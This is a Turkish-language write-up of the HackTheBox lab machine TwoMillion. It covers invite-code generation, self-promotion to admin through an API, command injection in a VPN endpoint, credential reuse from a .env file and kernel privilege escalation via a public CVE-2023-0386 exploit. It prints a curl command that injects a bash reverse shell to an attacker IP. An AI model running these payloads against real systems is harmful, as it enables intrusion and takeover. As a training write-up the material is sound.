---
title: "HackTheBox: TwoMillion"
author: b1lal
categories: [HackTheBox, CTF]
tags: [hackthebox, privilege escalation, api, javascript, js obfuscation, curl, kernel, cve 2023-0386, php, command injection]
render_with_liquid: false
description: "HackTheBox platformunda Easy zorluk seviyesine sahip olan TwoMillion isimli makineyi ele alacağız."
media_subpath: /images/hackthebox_twomillion/
layout: post
published: true  
lang: "tr"
image:
  path: main.png
  alt: "HackTheBox TwoMillion makinesi çözüm görseli"
---

<br>

# Makine Hakkında

Bu yazıda **HackTheBox** platformunda **Easy** zorluk seviyesine sahip olan ***TwoMillion*** isimli makineyi ele alacağım.

Makineyi ele geçirme süreci; davet kodunu hacklemek, bir kullanıcı hesabı oluşturmak, çeşitli API uç noktalarını keşfetmek ve bu uç noktalardan birini kullanarak kullanıcıyı **Admin** seviyesine yükseltmek üzerine kuruludur. Yönetici yetkilerine sahip olunduğunda, **VPN** oluşturma işlevindeki bir komut enjeksiyonu açığından faydalanarak sistem üzerinde shell elde edilebilir. Daha sonra, bulunan `.env` dosyası içerisindeki veritabanı kimlik bilgileriyle makineye admin kullanıcısı olarak giriş yapılabilir.

Son olarak, sistemin çekirdek sürümünün eski olduğu tespit edip `CVE-2023-0386` güvenlik açığından yararlanarak root yetkileri kazanılabilir. Bu write-up boyunca her adımı detaylı bir şekilde inceleyecek ve kullandığım teknikleri açıklayacağım.

<br>

## Keşif

İlk olarak hedef makinemizi başlatıyoruz ve açık olan portları keşfediyoruz.

```console
┌──(root㉿kali)-[~]
└─# rustscan -a 10.10.11.221  
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
To scan or not to scan? That is the question.

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.221:22
Open 10.10.11.221:80
[~] Starting Script(s)
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-31 09:55 EDT
Initiating Ping Scan at 09:55
Scanning 10.10.11.221 [4 ports]
Completed Ping Scan at 09:55, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:55
Completed Parallel DNS resolution of 1 host. at 09:55, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 09:55
Scanning 10.10.11.221 [2 ports]
Discovered open port 80/tcp on 10.10.11.221
Discovered open port 22/tcp on 10.10.11.221
Completed SYN Stealth Scan at 09:55, 0.17s elapsed (2 total ports)
Nmap scan report for 10.10.11.221
Host is up, received reset ttl 63 (0.18s latency).
Scanned at 2025-03-31 09:55:52 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.59 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (128B)
```

Hedef üzerinde 2 adet portun açık olduğunu görüyoruz. Daha detaylı bir nmap taraması başlatıyoruz ve 80 portunda yayınlanan web sitesini kontrol ediyoruz.

## İlk Erişim

### Davetiye Kodu Bulma

```bash
┌──(root㉿kali)-[~]
└─# curl -I http://10.10.11.221
HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Mon, 31 Mar 2025 14:00:18 GMT
Content-Type: text/html
Content-Length: 162
Connection: keep-alive
Location: http://2million.htb/
```

IP adresi bizi **http://2million.htb/** alan adına yönlendiriyor. Şimdi burayı kontrol ediyoruz.

```bash
┌──(root㉿kali)-[~]
└─# curl -IL http://10.10.11.221
HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Mon, 31 Mar 2025 14:00:24 GMT
Content-Type: text/html
Content-Length: 162
Connection: keep-alive
Location: http://2million.htb/

curl: (6) Could not resolve host: 2million.htb
```

**2million.htb** alan adını çözümleyemediği için `/etc/hosts` dosyasına ekliyoruz.

```bash
echo '10.10.11.221 2million.htb' | sudo cat >> /etc/hosts
```

<br>

Şimdi web sitesini kontrol ediyoruz ve böyle bir arayüz bizi karşılıyor.

![TwoMillion Website](website.png)

Sistemi kurcaladığımızda `/invite` adında bir dizin buluyoruz.

![TwoMillion Invite](invite.png)

Burada ki davetiye kodunun nasıl doğrulandığını anlamaya çalışmak için ağ trafiğini izliyoruz ve gözümüze `inviteapi.min.js` bu javascript dosyası çarpıyor.

![inviteapi.min.js](inviteapi-min-js.png)

JavaScript dosyasının içeriği : 

{: file="inviteapi.min.js" }
  ```javascript
  eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
  ```

Bu paketlenmiş dosya içeriğini [websitesini](https://lelinhtinh.github.io/de4js/) kullanarak çözümleme işlemi yapıyoruz. Çözdükten sonra elde ettiğimiz kod :

```javascript
function verifyInviteCode(code) {
  var formData = { "code": code };
  $.ajax({
    type: "POST",
    dataType: "json",
    data: formData,
    url: '/api/v1/invite/verify',
    success: function(response) {
      console.log(response);
    },
    error: function(response) {
      console.log(response);
    }
  });
}

function makeInviteCode() {
  $.ajax({
    type: "POST",
    dataType: "json",
    url: '/api/v1/invite/how/to/generate',
    success: function(response) {
      console.log(response);
    },
    error: function(response) {
      console.log(response);
    }
  });
}
```

Bu kod, davetiye kodunu doğrulamak ve yeni bir davetiye kodu oluşturmak için kullanılan iki fonksiyonu içeriyor. Buradan, `verifyInviteCode` fonksiyonunun `/api/v1/invite/verify` uç noktasına bir POST isteği gönderdiğini ve `makeInviteCode` fonksiyonunun ise `/api/v1/invite/how/to/generate` uç noktasını kullandığını görüyoruz.

Bu uç noktaları daha detaylı incelemek için buraya curl ile manuel olarak istek gönderiyoruz.

```bash
┌──(root㉿kali)-[~]
└─# curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

Bu uç noktadan dönen verinin `ROT13` şifreleme yöntemiyle şifrelendiği belirtiliyor. `ROT13` şifreleme yöntemi, alfabenin harflerini 13 karakter kaydırarak şifreleme yapan bir yöntemdir. Şifreyi çözmek için aşağıdaki işlemi yapıyoruz:

```bash
┌──(root㉿kali)-[~]
└─# echo "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

Şifre çözme işlemi sonucunda, davetiye kodunu oluşturmak için `/api/v1/invite/generate` uç noktasına bir POST isteği göndermemiz gerektiğini öğreniyoruz.


Bu bilgi doğrultusunda, `/api/v1/invite/generate` uç noktasına bir POST isteği gönderiyoruz ve davetiye kodunu alıyoruz:


```bash
┌──(root㉿kali)-[~]
└─# curl -s -X POST http://2million.htb/api/v1/invite/generate | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "VTFNRTEtMkowSTktV1pVNzgtNFlRTzA=",
    "format": "encoded"
  }
}
```

Bu gelen *code* değerinin base64 olduğunu düşünüyorum ve decode etmeye çalışıyorum. Ve başarılı bir şekilde davetiye kodunu elde etmiş oluyoruz.

```bash
┌──(root㉿kali)-[~]
└─# echo VTFNRTEtMkowSTktV1pVNzgtNFlRTzA= | base64 -d
U1ME1-2J0I9-WZU78-4YQO0 
```

### Hesap Yetkisi Yükseltme

<br>

Şimdi elimizdeki davetiye koduyla sisteme kayıt oluyoruz ve giriş yapıyoruz.

Dikkatimizi **access** sayfası çekiyor, bu sayfa kullanıcının makinelere erişmesi için VPN dosyası indirmesine ve yeniden oluşturabilmesine yarıyor. VPN dosyasını yeniden oluşturmak için *regenerate* butonuna basıyoruz.

![VPN regenerete](access.png)

Butona bastığımızda `/api/v1/user/vpn/regenerate` uç noktasına istek attığını görüyoruz.

![vpn-regenerate](regenerate.png)

Bu uç noktayı daha detaylı incelemek için curl komutunu kullanıyoruz. Ama istek attığımızda herhangi bir sonuç dönmüyor.

```bash
┌──(root㉿kali)-[~]
└─# curl http://2million.htb/api/v1/user/vpn/regenerate
      
```

Verbose modunu aktif ederek tekrar istek atıyoruz.

```bash
┌──(root㉿kali)-[~]
└─# curl -v http://2million.htb/api/v1/user/vpn/regenerate
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.221
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
* using HTTP/1.x
> GET /api/v1/user/vpn/regenerate HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.12.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 401 Unauthorized
< Server: nginx
< Date: Thu, 17 Apr 2025 18:39:56 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: PHPSESSID=ljqhu5oq9knprd7oi0bc4ut508; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb left intact
```

Görüldüğü üzere, bu uç noktaya erişim sağlamak için oturum açmış bir kullanıcıya ait yetkilendirme bilgileri gerekiyor. Bu nedenle, oturum açma işlemi sırasında bize atanan SESSIONID'yi de isteğimizin içerisine eklememiz gerekiyor.

Bu işlemi daha kolay yapabilmek için ilk olarak yakaladığımız isteği curl komutu olarak kopyalayabiliriz. (*Bu işlemi yapabilmek için isteğin üzerine gelerek Copy Value > Copy as cURL yapmamız yeteli olacaktır.*)


Şimdi isteğimizi tekrar yapıyoruz ve sorunsuz bir şekilde çalışıyor.

```bash
┌──(root㉿kali)-[~]
└─# curl -v 'http://2million.htb/api/v1/user/vpn/regenerate' -H 'Cookie: PHPSESSID=g6f3obgpgmn1u22q7sqrbelbqd' 
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.221
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
* using HTTP/1.x
> GET /api/v1/user/vpn/regenerate HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.12.1
> Accept: */*
> Cookie: PHPSESSID=g6f3obgpgmn1u22q7sqrbelbqd
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Thu, 17 Apr 2025 18:54:11 GMT
< Content-Type: application/octet-stream
< Content-Length: 10826
< Connection: keep-alive
< Content-Description: File Transfer
< Content-Disposition: attachment; filename="hacker.ovpn"
< Expires: 0
< Cache-Control: must-revalidate
< Pragma: public

<SNIP>
...
<SNIP>
```

Daha sonra `/api` uç noktasına istek atıyoruz ve ne cevap döneceğine bakıyoruz.

```bash
┌──(root㉿kali)-[~]
└─# curl -s 'http://2million.htb/api' -H 'Cookie: PHPSESSID=g6f3obgpgmn1u22q7sqrbelbqd' | jq 
{
  "/api/v1": "Version 1 of the API"
}
```

Herhangi bir hata mesajı döndürmedi şimdide `/api/v1` uç noktasına istek atalım.

```bash
┌──(root㉿kali)-[~]
└─# curl -s 'http://2million.htb/api/v1' -H 'Cookie: PHPSESSID=g6f3obgpgmn1u22q7sqrbelbqd' | jq
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

Burada özellikle dikkat çeken uç noktalar, **admin** ile ilgili olanlardır. İlk olarak `/api/v1/admin/auth` uç noktasına bir GET isteği göndererek kullanıcının admin yetkisine sahip olup olmadığını kontrol edebiliriz.

```bash
┌──(root㉿kali)-[~]
└─# curl -s 'http://2million.htb/api/v1/admin/auth' -H 'Cookie: PHPSESSID=g6f3obgpgmn1u22q7sqrbelbqd' | jq
{
  "message": false
}
```

Görüldüğü üzere, mevcut kullanıcı admin yetkisine sahip değil. Ancak, `/api/v1/admin/settings/update` uç noktasını kullanarak kendimize admin yetkisi verebiliriz. Bu uç nokta, kullanıcı ayarlarını güncellemek için kullanılıyor ve bir PUT isteği gerektiriyor. 

Öncelikle, bu uç noktaya gönderilecek veriyi belirlemek için bir deneme isteği yapıyoruz:

```bash
┌──(root㉿kali)-[~]
└─# curl -s -X PUT 'http://2million.htb/api/v1/admin/settings/update' -H 'Cookie: PHPSESSID=g6f3obgpgmn1u22q7sqrbelbqd' | jq
{
  "status": "danger",
  "message": "Invalid content type."
}
```

Herhangi bir yetkilendirme hatası almıyoruz ancak *Invalid content type* hatası veriyor. Content Type Başlığı ekleyerek devam edelim. (*Genel olarak json formatında çalıştığımız için ilk olarak `application/json` deniyoruz.*)

```bash
┌──(root㉿kali)-[~]
└─# curl -s -X PUT 'http://2million.htb/api/v1/admin/settings/update' -H 'Cookie: PHPSESSID=g6f3obgpgmn1u22q7sqrbelbqd' -H 'Content-Type: application/json' | jq
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```

Ve görüldüğü gibi az önceki hatayı atlatmayı başardık şimdi de **email** parametresinin eksik olduğunu söylüyor onu da verelim.

```bash
┌──(root㉿kali)-[~]
└─# curl -s -X PUT 'http://2million.htb/api/v1/admin/settings/update' -H 'Cookie: PHPSESSID=g6f3obgpgmn1u22q7sqrbelbqd' -H 'Content-Type: application/json' -d '{"email":"test@gmail.com"}'| jq
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```

Bu adımı da geçmeyi başardık şimdide **is_admin** değerini istiyor onu da **true** olarak verip deneyelim.

```bash
{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
```

True olarak yazdığım zaman 0 yada 1 olması gerektiğini söylüyor 1 olarak veriyorum.

```bash
┌──(root㉿kali)-[~]
└─# curl -s -X PUT 'http://2million.htb/api/v1/admin/settings/update' -H 'Cookie: PHPSESSID=g6f3obgpgmn1u22q7sqrbelbqd' -H 'Content-Type: application/json' -d '{"email":"test@gmail.com", "is_admin":1}'| jq     
{
  "id": 17,
  "username": "hacker",
  "is_admin": 1
}
```

Hesabımızı **admin** yetkisine çıkarmayı başardık. Şimdi tekrar kontrolünü yapalım.

```bash
┌──(root㉿kali)-[~]
└─# curl -s 'http://2million.htb/api/v1/admin/auth' -H 'Cookie: PHPSESSID=g6f3obgpgmn1u22q7sqrbelbqd' | jq       
{
  "message": true
}
```

### Komut Enjeksiyonu

<br>

Şimdi sonuncu admin yetkisindeki uç noktayı test ediyoruz.

```bash
┌──(root㉿kali)-[~]
└─# curl -s -X POST 'http://2million.htb/api/v1/admin/vpn/generate' -H 'Cookie: PHPSESSID=g6f3obgpgmn1u22q7sqrbelbqd'     
{"status":"danger","message":"Invalid content type."} 
```

Yine *Invalid content type* hatasını verdiği için `application/json` başlığını ekliyoruz.

<br>
<br>

```bash
┌──(root㉿kali)-[~]
└─# curl -s -X POST 'http://2million.htb/api/v1/admin/vpn/generate' -H 'Cookie: PHPSESSID=fko4pfbvsjj8q17rt8l47804kt' -H 'Content-Type: application/json' | jq
{
  "status": "danger",
  "message": "Missing parameter: username"
}
```

Şimdi de **username** parametresini bekliyor onu da ekliyoruz.

```bash
curl -s -X POST 'http://2million.htb/api/v1/admin/vpn/generate' -H 'Cookie: PHPSESSID=fko4pfbvsjj8q17rt8l47804kt' -H 'Content-Type: application/json' -d '{"username":"bilal"}' | head
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
```

Aldığımız çıktıda da görebildiğimiz gibi başarılı bir şekilde *vpn* dosyamızı üretebildik. Vpn dosyasını üretmek için bir bash dosyası kullanıyor ve herhangi bir kontrol sağlamıyorsa komut enjeksiyonu gerçekleştirebileceğimizi düşünüyoruz ve basit.e test ediyoruz.

```bash
┌──(root㉿kali)-[~]
└─# curl -s -X POST 'http://2million.htb/api/v1/admin/vpn/generate' -H 'Cookie: PHPSESSID=fko4pfbvsjj8q17rt8l47804kt' -H 'Content-Type: application/json' -d '{"username":"bilal; whoami #"}' | head
www-data
```

Tam olarak düşündüğümüz gibi sunucuda komut çalıştırabiliyoruz. Şimdi bunu sömürebiliriz.

```bash
curl -s -X POST 'http://2million.htb/api/v1/admin/vpn/generate' -H 'Cookie: PHPSESSID=fko4pfbvsjj8q17rt8l47804kt' -H 'Content-Type: application/json' -d "{\"username\":\"bilal; bash -c \\\"bash -i >& /dev/tcp/10.10.15.3/2828 0>&1\\\" #\"}" | head
```

Komutumuzu çalıştırmadan önce **nc** ile dinlemeye alıyoruz. Çalıştırdıktan sonra ise başarılı bir şekilde shell önümüze geliyor.

```bash
┌──(root㉿kali)-[~]
└─# nc -nvlp 2828 
listening on [any] 2828 ...
connect to [10.10.15.3] from (UNKNOWN) [10.10.11.221] 34936
bash: cannot set terminal process group (1193): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ 
```

İlk olarak bulunduğumuz dizinde neler olduğuna bakma oluyor.

```bash
www-data@2million:~/html$ ls -la
ls -la
total 56
drwxr-xr-x 10 root root 4096 Apr 21 19:10 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Apr 21 19:10 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
```

## Yanal Hareket

`.env` dosyası dikkatimizi çekiyor ve içeriğine bakıyoruz.

{: file=".env"}
```
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Bu parolanın aynı zamanda sistemdeki **admin** parolası ile aynı olup olmadığını kontrol ediyorum. Ve görüldüğü gibi işe yarıyor.

```bash
www-data@2million:~/html$ su - admin
su - admin
Password: SuperDuperPass123

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$
```

Bu şifreyi **ssh** bağlantısında da deniyorum ve oraya da bağlanabiliyorum. (*Daha temiz bir shell için oraya geçiyorum.*)

**users.txt** dosyasını burada okuyabiliyoruz.

## Yetki Yükseltme

SSH ile sisteme bağlanırken banner'da bir satır özellikle gözümüze çarpıyor

```text
You have mail.
Last login: Tue Jun  6 12:43:11 2023 from 10.10.14.6
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details
```

E-posta geldiğinden bahsediyor ve bizde e-posta'larını kontrol edebiliriz.

```bash
admin@2million:~$ find / -name admin 2>/dev/null
/home/admin
/var/mail/admin
```

Gelen e-posta'nın içeriği : 

```bash
admin@2million:~$ cat /var/mail/admin 
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

Gelen mailden de anladığımız üzere sistemde bir zaafiyet var ve yetki yükseltmek için kullanabiliriz. Ne tarz bir zaafiyet olduğunu araştırmamız gerekmektedir öncelikle.

**Overlays fuse** anahtar sözcükleriyle hızlı bir Google araması yapalım. Sonuçlar, Linux çekirdeğinde bulunan `CVE-2023-0386` olarak atanan bir yetki yükseltme zaafiyetini işaret ediyor. [Detaylar](https://nvd.nist.gov/vuln/detail/CVE-2023-0386)

Araştırmalarımızı biraz daha özelleştirdikten sonra bu github sayfasını buluyoruz ve denemeye koyuluyoruz.
[CVE-2023-0386](https://github.com/puckiestyle/CVE-2023-0386)


Repoyu yerel sistemimize klonluyoruz.
```bash
git clone https://github.com/puckiestyle/CVE-2023-0386.git
```

Daha sonra zip haline getirerek hedef sistemimize transfer edeceğiz.

```bash
zip -r exp.zip CVE-2023-0386
```

Başarılı bir şekilde ziplendikten sonra **scp** ile hedef sisteme transfer edebiliriz.

```bash
scp cve.zip admin@10.10.11.221:/tmp 
```

Şimdi hedef sistemimizle olan bağlantımıza geri dönüyor ve kodumuzu derleyip çalıştırmayı deneyeceğiz.

```bash
admin@2million:/tmp$ unzip cve.zip 
```

Klasörün içerisine girerek **make all** yazarak derleme işlemini gerçekleştiriyoruz. Bundan sonraki adımda iki adet terminale ihtiyaç duyacağız. İlk terminalde bu komutu çaşlıştırıyoruz. 

```bash
admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
```
Şimdi diğer terminalde `./exp` yazarak **exp** dosyasını çalıştıracağız. Son durum aşağıdaki şekilde olmalı : 


![Privilege Escalation](privesc.png)

Başarılı bir şekilde bu makineyi de tamamladık.

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

.post-desc {
  font-family: 'Open Sans', sans-serif !important;
}
</style>
